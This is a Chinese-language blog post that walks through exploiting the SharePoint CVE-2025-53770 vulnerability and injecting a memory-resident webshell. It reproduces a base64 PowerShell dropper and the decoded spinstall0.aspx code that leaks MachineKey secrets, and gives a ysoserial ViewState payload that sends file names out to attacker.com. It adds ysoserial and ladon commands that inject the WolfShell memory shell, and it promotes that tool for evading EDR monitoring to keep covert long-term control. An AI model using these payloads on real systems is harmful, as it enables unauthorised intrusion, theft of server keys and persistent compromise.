<!DOCTYPE html><html lang=zh><head><meta charset=UTF-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=renderer content=webkit><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><title>18K软件 AI工具 免费资源</title><link rel=stylesheet href=/css/style.css><link rel=stylesheet href=/libs/highlight/styles/18k.css><meta name=generator content="Hexo 7.3.0"></head><body id=bodyx><div class="hd posts"><a href=javascript:history.back() class=replay-btn>返回</a><div class=post-title><p></p><hr></div><div class=post-content><h1 id=SharePoint-CVE-2025-53770漏洞实战注入内存马><a href=#SharePoint-CVE-2025-53770漏洞实战注入内存马 class=headerlink title="SharePoint CVE-2025-53770漏洞实战注入内存马"></a>SharePoint CVE-2025-53770漏洞实战注入内存马</h1><p>捕获前这是一个0day漏洞，漏洞通过powershell命令写入webshell后门(读取key)，被CrowdStrike Falcon EDR进程监控日志记录捕获。初始访问执行命令触发警报，权限丢是早晚的事，可能是几小时，一两天，或者一两个月。所以对抗EDR不是单纯的混淆、加密等这种免杀方法，它的主打能力不是查杀，而是行为监控，要让行为不被监控到，才是能过EDR，那些单纯免杀让马上线，靠运气控制别人几个月或一两年的都只是因为管理员蠢(或者说压根没看日志,也不和EDR厂商说)，并不是真的能过EDR。EDR员工介入0day都分析出来了，何况通过马执行的很多已知的后渗透命令或工具？如果没有EDR这个0day也不会这么快被发现。所以金刚狼主打内存加载，文件不落地，程序通过反射加载，防止被进程监控发现，实现隐蔽长久的控制与后渗透。</p><h2 id=漏洞简介><a href=#漏洞简介 class=headerlink title=漏洞简介></a>漏洞简介</h2><p>2025年7月18日晚,Eye Security 首次发现一个新SharePoint 远程代码执行 (RCE)漏洞链在野外被大规模利用。几天前,该漏洞在 X 上被演示,目前正被用于入侵全球各地的本地 SharePoint 服务器。我们在本篇博文中发现的这个新漏洞链后来被微软命名为CVE-2025-53770和CVE-2025-53771 。</p><p>傍晚时分,我们的全天候检测团队收到了来自某位客户的<strong>CrowdStrike Falcon EDR部署的警报</strong> 。该警报标记了旧版 SharePoint 本地服务器上的可疑进程链,该进程链与最近上传的恶意.aspx文件相关联。</p><p>乍一看,它看起来很眼熟。一个经典的 Web Shell,在自定义路径中嵌入了混淆代码,旨在允许通过 HTTP 执行远程命令。我们之前见过很多类似的情况。然而,这个漏洞之所以引人注目,是因为它是如何实现的。</p><p>我们的第一个假设虽然平凡,但却似乎合理:对联合 ADFS 身份进行暴力破解或凭证填充攻击,然后使用有效凭证进行经过身份验证的上传或远程代码尝试。受影响的 SharePoint 服务器暴露在互联网上,并使用混合 ADFS 与 Azure AD 绑定。如果配置错误或版本过时,该堆栈可能构成危险的组合。</p><h3 id=一切似乎都证实了这个理论-凭证被泄露→shell-被丢弃→持久性实现。><a href=#一切似乎都证实了这个理论-凭证被泄露→shell-被丢弃→持久性实现。 class=headerlink title="一切似乎都证实了这个理论:凭证被泄露→shell 被丢弃→持久性实现。"></a>一切似乎都证实了这个理论:凭证被泄露→shell 被丢弃→持久性实现。</h3><p>仔细查看 IIS 日志,我们注意到 Referer 被设置为了&#x2F;_layouts&#x2F;SignOut.aspx。这很奇怪。用户刚退出登录,这怎么会是一个经过身份验证的请求呢?<br>2025-07-18 18:xx:04<proxymasked>POST &#x2F;_layouts&#x2F;15&#x2F;ToolPane.aspx DisplayMode&#x3D;Edit&amp;a&#x3D;&#x2F;ToolPane.aspx 443 -<proxymasked>Mozilla&#x2F;5.0+(Windows+NT+10.0;+Win64;+x64;+rv:120.0)+Gecko&#x2F;20100101+Firefox&#x2F;120.0 &#x2F;_layouts&#x2F;SignOut.aspx 302 0 0 707<br>2025-07-18 18:xx:05<proxymasked>GET &#x2F;_layouts&#x2F;15&#x2F;spinstall0.aspx - 443 -<proxymasked>Mozilla&#x2F;5.0+(Windows+NT+10.0;+Win64;+x64;+rv:120.0)+Gecko&#x2F;20100101+Firefox&#x2F;120.0 &#x2F;_layouts&#x2F;SignOut.aspx 200 0 0 31</proxymasked></proxymasked></proxymasked></proxymasked></p><p>有些事情不太对劲。</p><pre><code>我们在 ADFS 日志中没有发现成功的身份验证,或者至少日志记录不足……

恶意 IIS 日志不包含该cs-username列中的值...

POST 请求/_layouts/15/ToolPane.aspx看起来相当具体……

Referer 设置了所以/_layouts/SignOut.aspx无法验证,对吗? ...

我们产生了一种感觉,凭证从未 被使用过……
</code></pre><h3 id=攻击者如何能够在不进行任何身份验证的情况下将文件写入服务器><a href=#攻击者如何能够在不进行任何身份验证的情况下将文件写入服务器 class=headerlink title=攻击者如何能够在不进行任何身份验证的情况下将文件写入服务器?></a>攻击者如何能够在不进行任何身份验证的情况下将文件写入服务器?</h3><p>ToolShell(CVE-2025-49706 和 CVE-2025-49704)</p><p>那时我们才意识到,我们面对的不再是简单的基于凭证的入侵。</p><p>这并非暴力破解或网络钓鱼攻击,而是零日漏洞(后来被命名为CVE-2025-53770)。</p><p>经过一番挖掘,我们了解到,三天前,Code White GmbH的安全团队 演示了他们可以复现 SharePoint 中一个未经身份验证的 RCE 漏洞链,该漏洞链由今年 5 月初在柏林 Pwn2Own 漏洞大会上披露的两个漏洞 CVE-2025-49706 和 CVE-2025-49704 组合而成。他们将该漏洞链命名为ToolShell。<br>图片</p><p>当时,它被认为是一个概念验证。没有公开代码发布,细节也很少。但时机恰好吻合。行为也恰好吻合:漏洞&#x2F;_layouts&#x2F;15&#x2F;ToolPane.aspx、文件写入、无需登录以及对 Web 应用程序进程的完全控制。但使用的 HTTP Referer 标头却很奇怪:&#x2F;_layouts&#x2F;SignOut.aspx。</p><p>我们后来发现,这个特定的 Referer已于 2025 年 7 月 17 日被@irsdlMicrosoft.PerformancePoint.Scorecards.Client.dll模糊测试过,只剩下一个名为 的 .NET 二进制文件的反编译结果。我们认为这个 Referer 可能使CVE-2025-49706成为了一个 0day 漏洞,后来被微软命名为CVE-2025-53770。</p><h3 id=irsdl发现-layouts-SignOut-aspx有效的-Referer-可以绕过身份验证><a href=#irsdl发现-layouts-SignOut-aspx有效的-Referer-可以绕过身份验证 class=headerlink title="@irsdl发现&#x2F;_layouts&#x2F;SignOut.aspx有效的 Referer 可以绕过身份验证"></a>@irsdl发现&#x2F;_layouts&#x2F;SignOut.aspx有效的 Referer 可以绕过身份验证</h3><p>这不是凭证问题。我们偶然发现了一个已被广泛使用的武器化 Pwn2Own 漏洞。</p><p>ASPX 有效载荷:转储加密(SharpyShell)</p><p>当我们的团队开始审查受影响的系统时,我们原本以为会找到常见的嫌疑对象:用于命令执行、文件上传或横向移动的标准 Web Shell。然而,我们发现的却更加隐蔽,也更加危险:一个隐秘的spinstall0.aspx文件,其唯一目的是使用简单的 GET 请求从 SharePoint 服务器提取并泄露加密机密。</p><p>Powershell.exe 进程由受影响的 Windows Server 上的w3wp.exe祖父进程(IIS 工作进程)和父进程(由我们的 EDR 收集的遥测数据)生成:cmd.exe<br>powershell -EncodedCommand JABiAGEAcwBlADYANABTAHQAcgBpAG4AZwAgAD0AIAAiAFAAQ</p><p>解码后会显示有效载荷,解压 base64 层并将其内容放入spinstall0.aspx中:<br>$base64String &#x3D; “PCVAIEltcG9ydCBOYW1lc3BhY2U9IlN5c3RlbS5EaWFnbm9zdGljcyIgJT4NCjwlQCBJbXBvcnQgTmFtZXNwYWNlPSJTeXN0ZW0uSU8iICU+DQo8c2NyaXB0IHJ1bmF0PSJzZXJ2ZXIiIGxhbmd1YWdlPSJjIyIgQ09ERVBBR0U9IjY1MDAxIj4NCiAgICBwdWJsaWMgdm9pZCBQYWdlX2xvYWQoKQ0KICAgIHsNCgkJdmFyIHN5ID0gU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkuTG9hZCgiU3lzdGVtLldlYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWIwM2Y1ZjdmMTFkNTBhM2EiKTsNCiAgICAgICAgdmFyIG1rdCA9IHN5LkdldFR5cGUoIlN5c3RlbS5XZWIuQ29uZmlndXJhdGlvbi5NYWNoaW5lS2V5U2VjdGlvbiIpOw0KICAgICAgICB2YXIgZ2FjID0gbWt0LkdldE1ldGhvZCgiR2V0QXBwbGljYXRpb25Db25maWciLCBTeXN0ZW0uUmVmbGVjdGlvbi5CaW5kaW5nRmxhZ3MuU3RhdGljIHwgU3lzdGVtLlJlZmxlY3Rpb24uQmluZGluZ0ZsYWdzLk5vblB1YmxpYyk7DQogICAgICAgIHZhciBjZyA9IChTeXN0ZW0uV2ViLkNvbmZpZ3VyYXRpb24uTWFjaGluZUtleVNlY3Rpb24pZ2FjLkludm9rZShudWxsLCBuZXcgb2JqZWN0WzBdKTsNCiAgICAgICAgUmVzcG9uc2UuV3JpdGUoY2cuVmFsaWRhdGlvbktleSsifCIrY2cuVmFsaWRhdGlvbisifCIrY2cuRGVjcnlwdGlvbktleSsifCIrY2cuRGVjcnlwdGlvbisifCIrY2cuQ29tcGF0aWJpbGl0eU1vZGUpOw0KICAgIH0NCjwvc2NyaXB0Pg&#x3D;&#x3D;”<br>$destinationFile &#x3D; “C:\PROGRA<del>1\COMMON</del>1\MICROS<del>1\WEBSER</del>1\16\TEMPLATE\LAYOUTS\spinstall0.aspx”<br>$decodedBytes &#x3D; [System.Convert]::FromBase64String($base64String)<br>$decodedContent &#x3D; [System.Text.Encoding]::UTF8.GetString($decodedBytes)<br>$decodedContent | Set-Content -Path $destinationFile -ErrorAction Stop</p><p>spinstall0.aspx的内容,很可能是用Sharpyshell创建的(92bb4ddb98eeaf11fc15bb32e71d0a63256a0ed826a03ba293ce3a8bf057a514)<br>&lt;%@ImportNamespace&#x3D;”System.Diagnostics” %&gt;<br>&lt;%@ImportNamespace&#x3D;”System.IO” %&gt;</p><p>&lt;scriptrunat&#x3D;”server”language&#x3D;”c#”CODEPAGE&#x3D;”65001”&gt;<br>public void Page_load()<br>{<br>var sy &#x3D; System.Reflection.Assembly.Load(“System.Web, Version&#x3D;4.0.0.0, Culture&#x3D;neutral, PublicKeyToken&#x3D;b03f5f7f11d50a3a”);<br>var mkt &#x3D; sy.GetType(“System.Web.Configuration.MachineKeySection”);<br>var gac &#x3D; mkt.GetMethod(“GetApplicationConfig”, System.Reflection.BindingFlags.Static | System.Reflection.BindingFlags.NonPublic);<br>var cg &#x3D; (System.Web.Configuration.MachineKeySection)gac.Invoke(null, new object[0]);<br>Response.Write(cg.ValidationKey+”|”+cg.Validation+”|”+cg.DecryptionKey+”|”+cg.Decryption+”|”+cg.CompatibilityMode);<br>}<br></p><p>这不是典型的 Webshell。它没有交互式命令、反向 Shell 或命令与控制逻辑。相反,该页面调用了内部 .NET 方法来读取 SharePoint 服务器的MachineKey配置,其中包括ValidationKey。这些密钥对于生成有效的 Payload 至关重要__VIEWSTATE,而获取这些密钥的访问权限会有效地将任何经过身份验证的 SharePoint 请求转化为远程代码执行的机会。</p><p>然后一切都顺利了。</p><p>使用ysoserial对 SharePoint 进行 RCE</p><p>根据我们对CVE-2021-28474的阅读,我们了解到新的 ToolShell CVE 链可能如何完成完整的远程代码执行 (RCE):利用 SharePoint 处理反序列化和控制渲染的方式__VIEWSTATE。</p><p>在最初的CVE-2021-28474中,攻击者滥用 SharePoint 页面中的服务器端控件解析逻辑,将意外对象注入页面生命周期。这是因为 SharePoint使用存储在计算机配置中的ViewState签名密钥(即 )加载并执行了 ASP.NET 对象。通过构造带有序列化有效负载的恶意页面请求并对其进行正确签名,攻击者可以导致 SharePoint 反序列化任意对象并执行嵌入的命令。然而,该漏洞利用需要生成有效签名,而这又需要访问服务器的密钥。ValidationKeyValidationKey</p><p>现在,借助 ToolShell 链 (CVE-2025-49706 + CVE-2025-49704),攻击者似乎可以ValidationKey 直接从内存或配置中提取数据。一旦这些加密材料泄露,攻击者就可以使用名为ysoserial__VIEWSTATE的工具,构建完全有效且经过签名的有效载荷,如下例所示。</p><p>使用ysoserial,攻击者可以生成自己的有效 SharePoint 令牌以进行 RCE</p><h1 id=commandtoget-the-via-any-public-available-SharePoint-page-like-start-aspx><a href=#commandtoget-the-via-any-public-available-SharePoint-page-like-start-aspx class=headerlink title="commandtoget the  via any public available SharePoint page, like start.aspx"></a>commandtoget the<viewstate_generator>via any public available SharePoint page, like start.aspx</viewstate_generator></h1><p>curl -s <a target=_blank rel=noopener href=https://target.com/_layouts/15/start.aspx>https://target.com/_layouts/15/start.aspx</a> | grep -oP ‘__VIEWSTATEGENERATOR” value&#x3D;”\K[^”]+’</p><h1 id=example-malicious-Powershell-viewstate-payload-that-the-adversary-can-utilize-as-RCE-tolista-dir><a href=#example-malicious-Powershell-viewstate-payload-that-the-adversary-can-utilize-as-RCE-tolista-dir class=headerlink title="example malicious Powershell viewstate payload that the adversary can utilize as RCE tolista dir"></a>example malicious Powershell viewstate payload that the adversary can utilize as RCE tolista dir</h1><p>ysoserial.exe -p ViewState -g TypeConfuseDelegate<br>-c”powershell -nop -c &quot;dir ‘C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\15\TEMPLATE\LAYOUTS’ | % { Invoke-WebRequest -Uri (‘<a target=_blank rel=noopener href="http://attacker.com/?f=">http://attacker.com/?f=</a>‘ + [uri]::EscapeDataString($_.Name)) }&quot;“<br>–generator&#x3D;”<viewstate_generator>“<br>–validationkey&#x3D;”<validation_key>“<br>–validationalg&#x3D;”<validation_alg>“<br>–islegacy<br>–minify</validation_alg></validation_key></viewstate_generator></p><h1 id=finally-by-adding-the-generated-token-to-any-request-the><a href=#finally-by-adding-the-generated-token-to-any-request-the class=headerlink title="finally, by adding the generated token to any request, the"></a>finally, by adding the generated token to any request, the</h1><p>这些有效载荷可以嵌入任何恶意命令,并被服务器接受为可信输入,从而完成 RCE 攻击链,无需任何凭证。这反映了 2021 年被利用的设计漏洞,但现在被打包成一个现代零日漏洞链,具有自动 Shell 释放、完全持久性和零身份验证等特性。</p><h2 id=实战注入WolfShell内存马><a href=#实战注入WolfShell内存马 class=headerlink title=实战注入WolfShell内存马></a>实战注入WolfShell内存马</h2><p>参考 <a target=_blank rel=noopener href=https://k8gege.org/p/cve-2025-53770.html>https://k8gege.org/p/cve-2025-53770.html</a> 文章扫描获取目标</p><p><img src=http://www.18k.icu/img/vsexp/key.png alt=WolfShell></p><p>生成金刚狼反序列化payload</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c &quot;wolfmemshell.cs;C:/Windows/Microsoft.NET/Framework64/v4.0.30319/System.dll;C:/Windows/Microsoft.NET/Framework64/v4.0.30319/System.Web.dll&quot; <br>--generator=&quot;&lt;VIEWSTATE_GENERATOR&gt;&quot; \<br>--validationkey=&quot;&lt;VALIDATION_KEY&gt;&quot; \<br>--validationalg=&quot;&lt;VALIDATION_ALG&gt;&quot; \<br>--islegacy \<br>--minify &gt; wshell.txt<br></code></pre></td></tr></table></figure><p>执行RCE注入金刚狼内存马</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">ladon ViewStateExp https://test.com/_layouts/15/default.aspx wshell.txt<br></code></pre></td></tr></table></figure><h2 id=金刚狼-WolfShell><a href=#金刚狼-WolfShell class=headerlink title="金刚狼 WolfShell"></a>金刚狼 WolfShell</h2><p>金刚狼：首款支持多层内网级联的ASPX、ASHX高级WebShell管理工具，AES加密通信，无需代理，内存加载渗透工具，无文件落地隐蔽渗透目标，动态代码执行，ShellCode加载(Metasploit&#x2F;Cobalt Strike)，反弹Shell，Socks代理，内存马</p><h2 id=本地使用><a href=#本地使用 class=headerlink title=本地使用></a>本地使用</h2><p>本地使用 Hacking 里的工具,要运行HackTest，添加Shell: <a target=_blank rel=noopener href=http://127.0.0.1:8080/ >http://127.0.0.1:8080</a></p><h2 id=下载><a href=#下载 class=headerlink title=下载></a>下载</h2><p><a target=_blank rel=noopener href=https://github.com/0x7556/wolfshell>Wolfshell：https://github.com/0x7556/wolfshell</a></p><h2 id=免责声明><a href=#免责声明 class=headerlink title=免责声明></a>免责声明</h2><ul><li>使用WolfShell时，请遵循相关法律法规，确保在授权的环境中进行测试和使用。</li><li>本工具仅供教育和研究目的，任何滥用行为将由用户自行承担后果。</li></ul><h2 id=关注><a href=#关注 class=headerlink title=关注></a>关注</h2><ul><li>欢迎大家关注公众号和Github，您的关注、点赞、反馈，将是软件更新的动力来源!</li></ul></div></div><div class=footer id=footer><p>Copyright © 2025 <a class=flink target=_blank rel=noopener href=http://www.18k.icu>www.18k.icu</a> <label class="el-switch el-switch-green el-switch-sm" style=vertical-align:sub><input type=checkbox name=switch id=update_style> <span class=el-switch-style></span></label></p></div><input type=hidden id=web_style value=black> <input type=hidden id=valine_appid value=CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz> <input type=hidden id=valine_appKey value=FqiyUqbg7McKN2eG0MCewupf><script src=https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js></script><script src=/libs/highlight/highlight.pack.js></script><script src=/js/js.js></script><style>.v *{color:#698fca}.v .vlist .vcard .vhead .vsys{color:#3a3e4a}.v .vlist .vcard .vh .vmeta .vat{color:#638fd5}.v .vlist .vcard .vhead .vnick{color:#6ba1ff}.v a{color:#8696b1}.v .vlist .vcard .vhead .vnick:hover{color:#669bfc}</style><script>var _hmt=_hmt||[];(()=>{var e=document.createElement("script"),t=(e.src="https://hm.baidu.com/hm.js?eb7eb8199824646269cd262b46a87950",document.getElementsByTagName("script")[0]);t.parentNode.insertBefore(e,t)})()</script></body></html>